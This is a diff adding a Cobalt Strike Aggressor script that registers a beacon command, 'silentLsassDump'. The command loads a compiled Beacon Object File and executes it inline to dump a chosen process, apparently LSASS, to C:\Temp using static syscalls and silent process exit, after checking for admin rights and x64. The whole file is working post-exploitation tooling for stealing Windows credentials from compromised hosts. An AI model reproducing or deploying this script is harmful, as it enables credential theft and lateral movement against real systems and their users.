@@ -1,0 +1,43 @@
+beacon_command_register(
+"silentLsassDump", 
+"Use static syscalls and silent process exit to dump a process. Output to C:\\Temp\\", 
+"Usage: silentLsassDump <PID>");
+
+alias silentLsassDump {
+	local('$handle $data $args $pid');
+	
+	$bid = $1;
+
+	# figure out the arch of this session
+	$barch  = barch($1);
+	
+	if (!-isadmin $bid) {
+    	berror($bid, "You need elevated privileges.");
+		return;
+	}
+	
+	if (!-is64 $bid) {    
+		berror($bid, "SilentLsassDump is x64 only.");
+        return;
+	}
+
+	# read in the right BOF file
+	$handle = openf(script_resource("silentLsassDump.".$barch.".o"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	if(size(@_) < 2)
+	{
+		berror($bid, "Incorrect usage!");
+		berror($bid, beacon_command_detail("silentLsassDump"));
+		return;
+	}
+
+	# pack our arguments
+	$args = bof_pack($bid, "i", $2);
+	
+	btask($bid, "Silent Lsass Dump (@guervild)");
+	
+	# execute it.
+	beacon_inline_execute($bid, $data, "go", $args);
+}
